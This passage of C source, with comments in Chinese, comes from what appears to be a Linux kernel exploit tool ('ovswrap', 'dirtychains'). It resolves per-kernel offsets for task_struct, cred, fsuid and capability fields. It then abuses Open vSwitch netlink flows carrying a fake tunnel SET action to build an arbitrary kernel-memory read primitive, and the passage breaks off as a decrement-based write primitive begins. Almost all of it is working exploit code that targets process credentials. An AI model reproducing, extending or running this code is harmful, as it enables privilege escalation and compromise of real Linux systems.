 * 想静态编译进去 #include 即可。查找顺序（先命中者胜）：
 *
 *   -offset <dir> > $OVSWRAP_OFFSET_DIR > <可执行文件目录>/offset
 *   > ./offset > /usr/share/dirtychains/offset > 动态推导
 * ---------------------------------------------------------------------- */

#define KREC_NLANES 14

static const char *const krec_lane_names[KREC_NLANES] = {
    "tos", "ttl", "tp_src_0", "tp_src_1", "tp_dst_0", "tp_dst_1",
    "ipv4_src_0", "ipv4_src_1", "ipv4_src_2", "ipv4_src_3",
    "ipv4_dst_0", "ipv4_dst_1", "ipv4_dst_2", "ipv4_dst_3",
};

/* 本次运行最终用的配置来源，给 -v 和报错信息用 */
static char g_krec_src[600];
static const char *g_offset_dir;          /* -offset <dir> */

struct th_key {
    const char *name;                     /* target.h 里的宏名 */
    size_t off;                           /* offsetof(struct koffs, ...) */
    int ulong;                            /* 1 = unsigned long */
};

#define TH_I(n, f) { "KREC_" #n, offsetof(struct koffs, f), 0 }
#define TH_U(n, f) { "KREC_" #n, offsetof(struct koffs, f), 1 }

static const struct th_key th_keys[] = {
    TH_U(VMLINUX_MODULE_KTYPE, vmlinux_module_ktype),
    TH_U(VMLINUX_INIT_PID_NS, vmlinux_init_pid_ns),
    TH_I(NF_CONNTRACK_HELPER_ME, nf_conntrack_helper_me),
    TH_I(MODULE_KOBJ_KTYPE, module_kobj_ktype),
    TH_I(TASK_PID, task_pid),
    TH_I(TASK_CRED, task_cred),
    TH_I(TASK_PID_LINKS, task_pid_links),
    TH_I(CRED_FSUID, cred_fsuid),
    TH_I(CRED_FSGID, cred_fsgid),
    TH_I(CRED_CAP_PERMITTED, cred_cap_permitted),
    TH_I(CRED_CAP_EFFECTIVE, cred_cap_effective),
    TH_I(PID_NAMESPACE_IDR, pid_namespace_idr),
    TH_I(IDR_IDR_RT, idr_idr_rt),
    TH_I(IDR_BASE, idr_base),
    TH_I(XARRAY_XA_HEAD, xarray_xa_head),
    TH_I(XA_NODE_SHIFT, xa_node_shift),
    TH_I(XA_NODE_SLOTS, xa_node_slots),
    TH_I(PID_TASKS, pid_tasks),
    TH_I(HLIST_HEAD_FIRST, hlist_head_first),
    TH_I(DST_ENTRY_REF, dst_entry_ref),
    TH_I(METADATA_DST_TUN_INFO, metadata_dst_tun_info),
    TH_I(IP_TUNNEL_KEY_IPV4_SRC, ip_tunnel_key_ipv4_src),
    TH_I(IP_TUNNEL_KEY_IPV4_DST, ip_tunnel_key_ipv4_dst),
    TH_I(IP_TUNNEL_KEY_TOS, ip_tunnel_key_tos),
    TH_I(IP_TUNNEL_KEY_TTL, ip_tunnel_key_ttl),
    TH_I(IP_TUNNEL_KEY_TP_SRC, ip_tunnel_key_tp_src),
    TH_I(IP_TUNNEL_KEY_TP_DST, ip_tunnel_key_tp_dst),
    TH_I(OVS_CT_LABELS, ovs_ct_labels),
    TH_I(OVS_CT_ACTION_LEN, ovs_ct_action_len),
};

#undef TH_I
#undef TH_U

#define TH_KEY_MAX (int)(sizeof(th_keys) / sizeof(th_keys[0]))

/* 把块注释与行注释清成空格，字符串字面量里的斜杠不动 */
static void th_strip_comments(char *s)
{
    int in_str = 0, in_cmt = 0, in_line = 0;
    char *p = s;

    while (*p) {
        if (in_cmt) {
            if (p[0] == '*' && p[1] == '/') {
                p[0] = ' ';
                p[1] = ' ';
                p += 2;
                in_cmt = 0;
                continue;
            }
            if (*p != '\n')
                *p = ' ';
            p++;
            continue;
        }
        if (in_line) {
            if (*p == '\n')
                in_line = 0;
            else
                *p = ' ';
            p++;
            continue;
        }
        if (in_str) {
            if (*p == '\\' && p[1]) {
                p += 2;
                continue;
            }
            if (*p == '"')
                in_str = 0;
            p++;
            continue;
        }
        if (*p == '"') {
            in_str = 1;
            p++;
            continue;
        }
        if (p[0] == '/' && p[1] == '*') {
            p[0] = ' ';
            p[1] = ' ';
            p += 2;
            in_cmt = 1;
            continue;
        }
        if (p[0] == '/' && p[1] == '/') {
            *p = ' ';
            p++;
            in_line = 1;
            continue;
        }
        p++;
    }
}

static int th_lane_id(const char *name, size_t len)
{
    int i;

    for (i = 0; i < KREC_NLANES; i++)
        if (strlen(krec_lane_names[i]) == len &&
            !strncmp(krec_lane_names[i], name, len))
            return i;
    return -1;
}

/* "tos, ttl ,tp_src_0" -> lane_order[] */
static int th_parse_lanes(char *val, struct krec_hit *hit)
{
    char *p = val;

    hit->lane_count = 0;
    while (*p && hit->lane_count < KREC_NLANES) {
        char *e = strchr(p, ',');
        char *end = e ? e : p + strlen(p);
        char *b = p;
        int id;

        while (b < end && isspace((unsigned char)*b))
            b++;
        while (end > b && isspace((unsigned char)end[-1]))
            end--;
        if (end == b)
            break;
        id = th_lane_id(b, (size_t)(end - b));
        if (id < 0)
            return -1;
        hit->lane_order[hit->lane_count++] = id;
        if (!e)
            break;
        p = e + 1;
    }
    return hit->lane_count ? 0 : -1;
}

/*
 * 解析一张 target.h。成功返回 0，偏移写进 k，行为参数写进 g_krec_hit。
 * rel 回传文件里写的 release（可能和本机不同，属于借用）。
 */
static int th_load(const char *path, struct koffs *k, char *rel, size_t relsz)
{
    FILE *f;
    char line[512];
    char version[256] = "";
    unsigned long vhash = 0;
    int seen = 0, i;
    struct utsname u;

    f = fopen(path, "r");
    if (!f)
        return -1;

    memset(k, 0, sizeof(*k));
    memset(&g_krec_hit, 0, sizeof(g_krec_hit));
    rel[0] = 0;

    while (fgets(line, sizeof(line), f)) {
        char *p = line, *key, *val, *end;

        th_strip_comments(p);
        while (isspace((unsigned char)*p))
            p++;
        if (strncmp(p, "#define", 7) != 0)
            continue;
        p += 7;
        if (*p && !isspace((unsigned char)*p))
            continue;
        while (isspace((unsigned char)*p))
            p++;
        if (!*p)
            continue;

        key = p;
        while (*p && !isspace((unsigned char)*p))
            p++;
        if (!*p)
            continue;                    /* 无值宏，例如 #define TARGET_H */
        *p++ = 0;
        while (isspace((unsigned char)*p))
            p++;
        val = p;
        end = val + strlen(val);
        while (end > val && isspace((unsigned char)end[-1]))
            *--end = 0;
        if (end == val)
            continue;

        if (*val == '"') {               /* 字符串值去掉两侧引号 */
            val++;
            if (end > val && end[-1] == '"')
                end[-1] = 0;
        }

        if (!strcmp(key, "KREC_RELEASE")) {
            snprintf(rel, relsz, "%s", val);
            continue;
        }
        if (!strcmp(key, "KREC_VERSION")) {
            snprintf(version, sizeof(version), "%s", val);
            continue;
        }
        if (!strcmp(key, "KREC_VERSION_HASH")) {   /* 表里只存得下哈希时用 */
            vhash = strtoul(val, NULL, 0);
            continue;
        }
        if (!strcmp(key, "KREC_READ_CARRIER")) {
            g_krec_hit.read_carrier = !strcmp(val, "labels-only")
                                      ? CARRIER_LABELS_ONLY : CARRIER_TIMEOUT;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_WRITE_CARRIER")) {
            g_krec_hit.write_carrier = !strcmp(val, "labels-only")
                                       ? CARRIER_LABELS_ONLY : CARRIER_TIMEOUT;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_TUNNEL_INFO")) {
            g_krec_hit.tunnel_info = atoi(val);
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_REF_KIND")) {
            k->ref_kind = !strcmp(val, "__refcnt") ? 1 : 0;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_READ_LANES")) {
            if (th_parse_lanes(val, &g_krec_hit) != 0) {
                fclose(f);
                return -1;
            }
            seen++;
            continue;
        }

        for (i = 0; i < TH_KEY_MAX; i++) {
            unsigned long v;

            if (strcmp(key, th_keys[i].name))
                continue;
            v = strtoul(val, NULL, 0);
            if (th_keys[i].ulong)
                *(unsigned long *)((char *)k + th_keys[i].off) = v;
            else
                *(int *)((char *)k + th_keys[i].off) = (int)v;
            seen++;
            break;
        }
    }
    fclose(f);

    if (seen < 20)                       /* 空文件 / 半截 / 键名写错 */
        return -1;

    /* 这几项缺了就没法用，直接判为无效表 */
    if (!k->task_pid || !k->task_cred || !k->cred_fsuid ||
        !k->vmlinux_module_ktype || !k->vmlinux_init_pid_ns)
        return -1;

    g_krec_hit.hit = 1;
    g_krec_hit.exact = 0;
    if (uname(&u) == 0 && !strcmp(rel, u.release)) {
        if (version[0] && !strcmp(version, u.version))
            g_krec_hit.exact = 1;
        else if (!version[0] && vhash && vhash == fnv1a32(u.version))
            g_krec_hit.exact = 1;        /* 只有哈希也比 release 可靠 */
    }
    if (!g_krec_hit.lane_count) {        /* 没写 lanes 就按默认全量顺序 */
        for (i = 0; i < KREC_NLANES; i++)
            g_krec_hit.lane_order[i] = i;
        g_krec_hit.lane_count = KREC_NLANES;
    }
    return 0;
}

/* 主版本号：5.8.0-59-generic -> "5" */
static int th_major(const char *release, char *out, size_t outsz)
{
    size_t n = 0;

    while (isdigit((unsigned char)release[n]))
        n++;
    if (!n || n + 1 > outsz)
        return -1;
    memcpy(out, release, n);
    out[n] = 0;
    return 0;
}

static int th_probe(const char *root, const char *major, const char *release,
                    char *out, size_t outsz)
{
    snprintf(out, outsz, "%s/%s系/%s/target.h", root, major, release);
    if (access(out, R_OK) == 0)
        return 0;
    snprintf(out, outsz, "%s/%s/target.h", root, release);   /* 平铺也认 */
    if (access(out, R_OK) == 0)
        return 0;
    return -1;
}

/* 精确目录没有时，在 <root>/<N>系 下找名字前缀最接近的一个 */
static int th_probe_fuzzy(const char *root, const char *major,
                          const char *release, char *out, size_t outsz)
{
    char dir[512], best[256] = "";
    DIR *d;
    struct dirent *e;
    size_t rlen = strlen(release);
    size_t blen = 0;

    snprintf(dir, sizeof(dir), "%s/%s系", root, major);
    d = opendir(dir);
    if (!d)
        return -1;

    while ((e = readdir(d)) != NULL) {
        size_t n;

        if (e->d_name[0] == '.')
            continue;
        n = strlen(e->d_name);
        if (n >= rlen ? strncmp(e->d_name, release, rlen)
                      : strncmp(release, e->d_name, n))
            continue;
        if (n > blen) {                  /* 取重叠最长的 */
            blen = n;
            snprintf(best, sizeof(best), "%s", e->d_name);
        }
    }
    closedir(d);

    if (!best[0])
        return -1;
    snprintf(out, outsz, "%s/%s系/%s/target.h", root, major, best);
    return access(out, R_OK) == 0 ? 0 : -1;
}

/* 列出 <root>/<N>系 下已有的目录，用于「本机没配置表」时提示 */
/* 优先列同一个 X.Y 系列的，否则列整个大版本的前几个 */
static void th_list_series(const char *root, const char *major, const char *want)
{
    char dir[512], pref[32];
    char same[4][256], other[4][256];
    DIR *d;
    struct dirent *e;
    int nsame = 0, nother = 0, total = 0, plen = 0;
    const char *dot;

    /* want 形如 6.6.117-... -> pref = "6.6" */
    dot = strchr(want, '.');
    if (dot && (dot = strchr(dot + 1, '.')) != NULL) {
        plen = (int)(dot - want);
        if (plen >= (int)sizeof(pref))
            plen = 0;
        else
            memcpy(pref, want, (size_t)plen), pref[plen] = 0;
    }

    snprintf(dir, sizeof(dir), "%s/%s系", root, major);
    d = opendir(dir);
    if (!d)
        return;
    while ((e = readdir(d)) != NULL) {
        if (e->d_name[0] == '.')
            continue;
        total++;
        if (plen && !strncmp(e->d_name, pref, (size_t)plen) &&
            e->d_name[plen] == '.') {
            if (nsame < 4)
                snprintf(same[nsame], sizeof(same[0]), "%s", e->d_name);
            nsame++;
        } else if (nother < 4) {
            snprintf(other[nother], sizeof(other[0]), "%s", e->d_name);
            nother++;
        }
    }
    closedir(d);

    if (!total) {
        pr_dim("    该系列还没有任何表\n");
        return;
    }
    if (nsame) {
        int i, shown = nsame < 4 ? nsame : 4;

        pr_dim("    %s.* 有 %d 个：", pref, nsame);
        for (i = 0; i < shown; i++)
            pr_raw("%s%s", i ? "、" : "", same[i]);
        pr_raw("%s\n", nsame > shown ? " …\n" : "\n");
        return;
    }
    pr_dim("    %s系 共 %d 个，例如：", major, total);
    pr_raw("%s%s", other[0], nother > 1 ? "、" : "");
    if (nother > 1)
        pr_raw("%s", other[1]);
    pr_raw("%s\n", nother > 2 ? " …\n" : "\n");
}

static int th_resolve(struct koffs *k)
{
    const char *roots[8];
    char major[8], path[600], exeroot[600], rel[128];
    struct utsname u;
    int nr = 0, i;

    if (g_force_derive) {
        pr_dim("  配置表：-force-derive 指定跳过\n");
        return -1;
    }
    if (uname(&u) != 0)
        return -1;
    {
        const char *want = g_krec_force ? g_krec_force : u.release;

        if (th_major(want, major, sizeof(major)) != 0)
            return -1;
    }

    if (g_offset_dir)
        roots[nr++] = g_offset_dir;
    {
        const char *e = getenv("OVSWRAP_OFFSET_DIR");

        if (e && *e)
            roots[nr++] = e;
    }
    {
        char exe[512];
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);

        if (n > 0) {
            char *sl;

            exe[n] = 0;
            sl = strrchr(exe, '/');
            if (sl) {
                *sl = 0;
                snprintf(exeroot, sizeof(exeroot), "%s/offset", exe);
                roots[nr++] = exeroot;
            }
        }
    }
    roots[nr++] = "offset";                       /* 当前目录 */
    roots[nr++] = "/usr/share/dirtychains/offset";
    roots[nr++] = "/usr/local/share/dirtychains/offset";
    /* 1.6 及更早版本装在这里，留着免得升级后配置表全丢 */
    roots[nr++] = "/usr/share/dirtyfrag/offset";
    roots[nr++] = "/usr/local/share/dirtyfrag/offset";

    for (i = 0; i < nr; i++) {
        const char *want = g_krec_force ? g_krec_force : u.release;

        if (th_probe(roots[i], major, want, path, sizeof(path)) != 0 &&
            th_probe_fuzzy(roots[i], major, want, path, sizeof(path)) != 0)
            continue;
        if (th_load(path, k, rel, sizeof(rel)) != 0) {
            pr_err("  配置表 %s 解析失败（格式不对或字段不全）\n", path);
            continue;
        }

        snprintf(g_krec_src, sizeof(g_krec_src), "%s", path);
        snprintf(g_krec_hit.release, sizeof(g_krec_hit.release), "%s",
                 rel[0] ? rel : u.release);
        g_tun_info = g_krec_hit.tunnel_info;
        pr_ok("  配置表命中：%s\n", path);
        if (rel[0] && strcmp(rel, u.release))
            pr_dim("    表里的 release=%s，本机是 %s，属于借用。\n",
                   rel, u.release);
        else if (!g_krec_hit.exact)
            pr_dim("    同 release、build 串不同（或表里没写 KREC_VERSION）；\n"
                   "    自检对不上就 -force-derive。\n");
        return 0;
    }

    {
        const char *want = g_krec_force ? g_krec_force : u.release;

        pr_dim("  配置表：%s系 下没有 %s 的 target.h，回退到动态推导\n",
               major, want);
        for (i = 0; i < nr; i++) {
            char dir[512];

            snprintf(dir, sizeof(dir), "%s/%s系", roots[i], major);
            if (access(dir, R_OK) != 0)
                continue;
            pr_dim("    配置根在 %s，补一张即可：\n", roots[i]);
            pr_dim("      mkdir -p %s/%s系/%s && \\\n"
                   "      ./ovswrap -dump-target > %s/%s系/%s/target.h\n",
                   roots[i], major, want, roots[i], major, want);
            th_list_series(roots[i], major, want);
            return -1;
        }
    }
    pr_dim("    还没有 offset/ 目录。建一个放 target.h 就行，例如：\n");
    pr_dim("      mkdir -p offset/%s系/%s && \\\n"
           "      ./ovswrap -dump-target > offset/%s系/%s/target.h\n",
           major, u.release, major, u.release);
    return -1;
}

/* 命中返回 0 并填好 k / g_krec_hit / g_tun_info；未收录返回 -1 */
static int krec_resolve(struct koffs *k)
{
    memset(&g_krec_hit, 0, sizeof(g_krec_hit));
    g_krec_src[0] = 0;

    /* 唯一来源：offset/<N>系/<release>/target.h（th_resolve 内部按序找根目录） */
    if (th_resolve(k) != 0)
        return -1;

    pr_dim("    module_ktype=0x%lx init_pid_ns=0x%lx ref=%s\n"
           "    read=%s write=%s tunnel_info=%d lanes=%d\n",
           k->vmlinux_module_ktype, k->vmlinux_init_pid_ns,
           k->ref_kind ? "__refcnt" : "__rcuref",
           g_krec_hit.read_carrier == CARRIER_TIMEOUT ? "timeout"
                                                      : "labels-only",
           g_krec_hit.write_carrier == CARRIER_TIMEOUT ? "timeout"
                                                       : "labels-only",
           g_krec_hit.tunnel_info, g_krec_hit.lane_count);
    return 0;
}

static int derive_offsets(struct koffs *k)
{
    int mkobj, kobj, ktype, size, key_off;

    memset(k, 0, sizeof(*k));

    if (krec_resolve(k) == 0)
        return 0;

    if (derive_symbols(k) != 0) {
        pr_err("  拿不到 _text / module_ktype / init_pid_ns 的地址。\n");
        pr_dim("    普通用户下 /proc/kallsyms 的地址会被 kptr_restrict 清零；\n"
               "    需要 /boot/System.map-$(uname -r)，或者以 root 运行一次。\n");
        return -1;
    }
    pr_dim("  module_ktype 偏移 = 0x%lx, init_pid_ns 偏移 = 0x%lx\n",
           k->vmlinux_module_ktype, k->vmlinux_init_pid_ns);

    if (koff_field("nf_conntrack_helper", "me", &k->nf_conntrack_helper_me))
        return -1;
    if (koff_field("module", "mkobj", &mkobj))
        return -1;
    if (koff_field("module_kobject", "kobj", &kobj))
        return -1;
    if (koff_field("kobject", "ktype", &ktype))
        return -1;
    k->module_kobj_ktype = mkobj + kobj + ktype;

    if (koff_field("ovs_conntrack_info", "labels", &k->ovs_ct_labels))
        return -1;
    if (koff_struct_size("ovs_conntrack_info", &size))
        return -1;
    k->ovs_ct_action_len = NLA_HDR_LEN + size;

    if (koff_field("ip_tunnel_info", "key", &key_off))
        return -1;
    if (koff_field("ip_tunnel_key", "src", &size))
        return -1;
    k->ip_tunnel_key_ipv4_src = key_off + size;
    if (koff_field("ip_tunnel_key", "dst", &size))
        return -1;
    k->ip_tunnel_key_ipv4_dst = key_off + size;
    if (koff_field("ip_tunnel_key", "tos", &size))
        return -1;
    k->ip_tunnel_key_tos = key_off + size;
    if (koff_field("ip_tunnel_key", "ttl", &size))
        return -1;
    k->ip_tunnel_key_ttl = key_off + size;
    if (koff_field("ip_tunnel_key", "tp_src", &size))
        return -1;
    k->ip_tunnel_key_tp_src = key_off + size;
    if (koff_field("ip_tunnel_key", "tp_dst", &size))
        return -1;
    k->ip_tunnel_key_tp_dst = key_off + size;

    if (koff_field("dst_entry", "__rcuref", &k->dst_entry_ref) == 0) {
        k->ref_kind = 0;
    } else if (koff_field("dst_entry", "__refcnt", &k->dst_entry_ref) == 0) {
        k->ref_kind = 1;
    } else {
        pr_err("  dst_entry 里既没有 __rcuref 也没有 __refcnt\n");
        return -1;
    }

    if (koff_field("task_struct", "pid", &k->task_pid) ||
        koff_field("task_struct", "cred", &k->task_cred) ||
        koff_field("task_struct", "pid_links", &k->task_pid_links) ||
        koff_field("cred", "fsuid", &k->cred_fsuid) ||
        koff_field("cred", "fsgid", &k->cred_fsgid) ||
        koff_field("cred", "cap_permitted", &k->cred_cap_permitted) ||
        koff_field("cred", "cap_effective", &k->cred_cap_effective) ||
        koff_field("pid_namespace", "idr", &k->pid_namespace_idr) ||
        koff_field("idr", "idr_rt", &k->idr_idr_rt) ||
        koff_field("idr", "idr_base", &k->idr_base) ||
        koff_field("xarray", "xa_head", &k->xarray_xa_head) ||
        koff_field("xa_node", "shift", &k->xa_node_shift) ||
        koff_field("xa_node", "slots", &k->xa_node_slots) ||
        koff_field("pid", "tasks", &k->pid_tasks) ||
        koff_field("hlist_head", "first", &k->hlist_head_first) ||
        koff_field("metadata_dst", "u", &k->metadata_dst_tun_info))
        return -1;

    return 0;
}

/* -------------------------------------------------------------------------
 * OVS datapath / flow
 * ---------------------------------------------------------------------- */

struct ovs_header {
    int32_t dp_ifindex;
};

static int ovs_create_datapath(struct genl *g, int family, const char *name)
{
    struct buf p;
    uint32_t zero = 0;
    int ret;

    buf_init(&p, 128);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, 0);                                  /* ovs_header.dp_ifindex */
    nla_put(&p, OVS_DP_ATTR_NAME, name, strlen(name) + 1);
    nla_put(&p, OVS_DP_ATTR_UPCALL_PID, &zero, 4);
    nla_put(&p, OVS_DP_ATTR_USER_FEATURES, &zero, 4);

    ret = genl_xchg(g, family, OVS_DP_CMD_NEW, OVS_DATAPATH_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_create_flow(struct genl *g, int family, int ifindex,
                           const struct buf *key, const struct buf *actions)
{
    struct buf p;
    int ret;

    buf_init(&p, key->len + actions->len + 64);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);
    nla_put(&p, OVS_FLOW_ATTR_ACTIONS, actions->p, actions->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_delete_flow(struct genl *g, int family, int ifindex,
                           const struct buf *key)
{
    struct buf p;
    int ret;

    buf_init(&p, key->len + 64);
    if (!p.p)
        return -ENOMEM;
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_DEL, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST | NLM_F_ACK, NULL);
    buf_free(&p);
    return ret;
}

static int ovs_get_actions(struct genl *g, int family, int ifindex,
                           const struct buf *key, struct buf *out)
{
    struct buf p, reply;
    int ret;
    size_t off;
    int found = 0;

    buf_init(&p, key->len + 64);
    buf_init(&reply, 8192);
    if (!p.p || !reply.p) {
        buf_free(&p);
        buf_free(&reply);
        return -ENOMEM;
    }
    buf_u32(&p, (uint32_t)ifindex);
    nla_put(&p, OVS_FLOW_ATTR_KEY, key->p, key->len);

    ret = genl_xchg(g, family, OVS_FLOW_CMD_GET, OVS_FLOW_VERSION,
                    p.p, p.len, NLM_F_REQUEST, &reply);
    buf_free(&p);
    if (ret < 0) {
        buf_free(&reply);
        return ret;
    }

    /* reply = genlmsghdr(4) + ovs_header(4) + attrs */
    off = 8;
    while (off + 4 <= reply.len) {
        uint16_t alen, atype;

        memcpy(&alen, reply.p + off, 2);
        memcpy(&atype, reply.p + off + 2, 2);
        if (alen < 4 || off + alen > reply.len)
            break;
        if (atype == OVS_FLOW_ATTR_ACTIONS) {
            out->len = 0;
            buf_put(out, reply.p + off + 4, alen - 4);
            found = 1;
            break;
        }
        off += (alen + 3) & ~3u;
    }
    buf_free(&reply);
    return found ? 0 : -ENODATA;
}

/* attribute 迭代器 */
struct attr {
    uint16_t type;
    const unsigned char *payload;
    size_t len;
    size_t raw_len;
};

static int attr_next(const unsigned char *p, size_t total, size_t *off,
                     struct attr *a)
{
    uint16_t alen, atype;

    if (*off + 4 > total)
        return -1;
    memcpy(&alen, p + *off, 2);
    memcpy(&atype, p + *off + 2, 2);
    if (alen < 4 || *off + alen > total)
        return -1;
    a->type = atype;
    a->payload = p + *off + 4;
    a->len = alen - 4;
    a->raw_len = alen;
    *off += (alen + 3) & ~3u;
    return 0;
}

/* -------------------------------------------------------------------------
 * 读原语
 * ---------------------------------------------------------------------- */

struct lane {
    const char *name;
    int field_off;
    uint16_t attr;
    int idx;
    int optional_zero;
};

#define N_LANES 14

static void build_lanes(const struct koffs *k, struct lane *lanes)
{
    struct lane def[N_LANES];
    int used[N_LANES];
    int i, n = 0, out = 0;

    def[n++] = (struct lane){ "tos", k->ip_tunnel_key_tos,
                              OVS_TUNNEL_KEY_ATTR_TOS, 0, 1 };
    def[n++] = (struct lane){ "ttl", k->ip_tunnel_key_ttl,
                              OVS_TUNNEL_KEY_ATTR_TTL, 0, 0 };
    def[n++] = (struct lane){ "tp_src_0", k->ip_tunnel_key_tp_src,
                              OVS_TUNNEL_KEY_ATTR_TP_SRC, 0, 1 };
    def[n++] = (struct lane){ "tp_src_1", k->ip_tunnel_key_tp_src + 1,
                              OVS_TUNNEL_KEY_ATTR_TP_SRC, 1, 1 };
    def[n++] = (struct lane){ "tp_dst_0", k->ip_tunnel_key_tp_dst,
                              OVS_TUNNEL_KEY_ATTR_TP_DST, 0, 1 };
    def[n++] = (struct lane){ "tp_dst_1", k->ip_tunnel_key_tp_dst + 1,
                              OVS_TUNNEL_KEY_ATTR_TP_DST, 1, 1 };
    for (i = 0; i < 4; i++)
        def[n++] = (struct lane){ "ipv4_src", k->ip_tunnel_key_ipv4_src + i,
                                  OVS_TUNNEL_KEY_ATTR_IPV4_SRC, i, 1 };
    for (i = 0; i < 4; i++)
        def[n++] = (struct lane){ "ipv4_dst", k->ip_tunnel_key_ipv4_dst + i,
                                  OVS_TUNNEL_KEY_ATTR_IPV4_DST, i, 1 };

    /*
     * 配置表里每条记录都记了「这个内核的 fake SET 实际会回填哪些
     * tunnel key」。命中的内核按它的顺序先试，剩下的排在后面。
     */
    memset(used, 0, sizeof(used));
    if (g_krec_hit.hit) {
        for (i = 0; i < g_krec_hit.lane_count; i++) {
            int id = g_krec_hit.lane_order[i];

            if (id < 0 || id >= N_LANES || used[id])
                continue;
            used[id] = 1;
            lanes[out++] = def[id];
        }
    }
    for (i = 0; i < n; i++)
        if (!used[i])
            lanes[out++] = def[i];
}

struct reader {
    struct genl *g;
    int flow_family;
    int dp_ifindex;
    const struct koffs *k;
    struct lane lanes[N_LANES];
    int seq;
    int carrier_mode;        /* CARRIER_AUTO / TIMEOUT / LABELS_ONLY */
    int timeout_disabled;
    int ct_action_len;
    int labels_off;
};

struct writer {
    struct genl *g;
    int flow_family;
    int dp_ifindex;
    const struct koffs *k;
    int seq;
    int carrier_mode;
    int timeout_disabled;
    int ct_action_len;
    int labels_off;
};

static int fake_set_error(int ret)
{
    /* EINVAL：内核不认这个 carrier；ENODATA：flow get 没回 actions */
    return ret == -EINVAL || ret == -ENODATA;
}

/* 选中 carrier 列表；auto 模式先试 timeout，失败后退到 labels-only */
static int carrier_candidates(struct reader *r, int *out)
{
    int n = 0;

    if (r->carrier_mode == CARRIER_TIMEOUT) {
        out[n++] = CARRIER_TIMEOUT;
    } else if (r->carrier_mode == CARRIER_LABELS_ONLY) {
        out[n++] = CARRIER_LABELS_ONLY;
    } else if (r->timeout_disabled) {
        out[n++] = CARRIER_LABELS_ONLY;
    } else {
        out[n++] = CARRIER_TIMEOUT;
        out[n++] = CARRIER_LABELS_ONLY;
    }
    return n;
}

/*
 * 读一个字节。
 * 原理：把 tun_dst 设成 (addr - field_off - metadata_dst.u)，
 * fake SET 里的 TUNNEL_INFO 就会把 ip_tunnel_info 放在我们指定的位置。
 * flow get 回显 tunnel key 时，对应字段就是从 addr 读到的那一字节。
 */
static int read_u8_lane(struct reader *r, uint64_t addr, const struct lane *ln,
                        int *out)
{
    struct buf key, actions, dumped;
    int carriers[2];
    int nc, i;
    int ret = -ENODATA;
    uint64_t tun_dst;

    tun_dst = addr - (uint64_t)ln->field_off - (uint64_t)r->k->metadata_dst_tun_info;

    nc = carrier_candidates(r, carriers);
    for (i = 0; i < nc; i++) {
        int carrier = carriers[i];

        buf_init(&key, 256);
        buf_init(&actions, 32768);
        buf_init(&dumped, 65536);
        if (!key.p || !actions.p || !dumped.p) {
            buf_free(&key); buf_free(&actions); buf_free(&dumped);
            return -ENOMEM;
        }

        flow_key(&key, ++r->seq);
        clone_with_fake_set(&actions, carrier, tun_dst,
                            r->ct_action_len, r->labels_off);

        ret = ovs_create_flow(r->g, r->flow_family, r->dp_ifindex, &key, &actions);
        if (ret == 0)
            ret = ovs_get_actions(r->g, r->flow_family, r->dp_ifindex,
                                  &key, &dumped);
        ovs_delete_flow(r->g, r->flow_family, r->dp_ifindex, &key);

        buf_free(&key);
        buf_free(&actions);

        if (ret != 0) {
            buf_free(&dumped);
            if (fake_set_error(ret) && i + 1 < nc) {
                if (!r->timeout_disabled && r->carrier_mode == CARRIER_AUTO) {
                    pr_dim("    fake SET timeout 载体不被接受，改用 labels-only\n");
                    r->timeout_disabled = 1;
                }
                continue;
            }
            return ret;
        }

        /* 解析回显的 actions */
        {
            size_t off = 0;
            struct attr top;

            while (attr_next(dumped.p, dumped.len, &off, &top) == 0) {
                size_t toff = 0;
                struct attr tkey;

                if (top.type != OVS_ACTION_ATTR_SET)
                    continue;

                while (attr_next(top.payload, top.len, &toff, &tkey) == 0) {
                    size_t koff = 0;
                    struct attr ta;
                    int saw = 0;

                    if (tkey.type != OVS_KEY_ATTR_TUNNEL)
                        continue;

                    while (attr_next(tkey.payload, tkey.len, &koff, &ta) == 0) {
                        if (ta.type == OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE) {
                            buf_free(&dumped);
                            return -ENODATA;
                        }
                        saw = 1;
                        if (ta.type == (uint16_t)ln->attr) {
                            if ((int)ta.len <= ln->idx) {
                                buf_free(&dumped);
                                return -EPROTO;
                            }
                            *out = ta.payload[ln->idx];
                            buf_free(&dumped);
                            return 0;
                        }
                    }
                    if (saw && ln->optional_zero) {
                        *out = 0;
                        buf_free(&dumped);
                        return 0;
                    }
                }
            }
        }
        buf_free(&dumped);
        return -ENODATA;
    }
    return ret;
}

static int ovs_read_u8(struct reader *r, uint64_t addr, int *out)
{
    int i;

    for (i = 0; i < N_LANES; i++) {
        int v = 0;

        if (read_u8_lane(r, addr, &r->lanes[i], &v) == 0) {
            *out = v;
            return 0;
        }
    }
    return -ENODATA;
}

static int ovs_read_bytes(struct reader *r, uint64_t addr, unsigned char *out,
                          size_t n)
{
    size_t i;

    for (i = 0; i < n; i++) {
        int v = 0;

        if (ovs_read_u8(r, addr + i, &v) != 0)
            return -1;
        out[i] = (unsigned char)v;
    }
    return 0;
}

static int ovs_read_u32(struct reader *r, uint64_t addr, uint32_t *out)
{
    unsigned char b[4];

    if (ovs_read_bytes(r, addr, b, 4) != 0)
        return -1;
    memcpy(out, b, 4);
    return 0;
}

static int ovs_read_u64(struct reader *r, uint64_t addr, uint64_t *out)
{
    unsigned char b[8];

    if (ovs_read_bytes(r, addr, b, 8) != 0)
        return -1;
    memcpy(out, b, 8);
    return 0;
}

/* -------------------------------------------------------------------------
 * 写原语：dst_release() 每次 -1
 * ---------------------------------------------------------------------- */

static int decrement_once(struct writer *w, uint64_t addr)
{
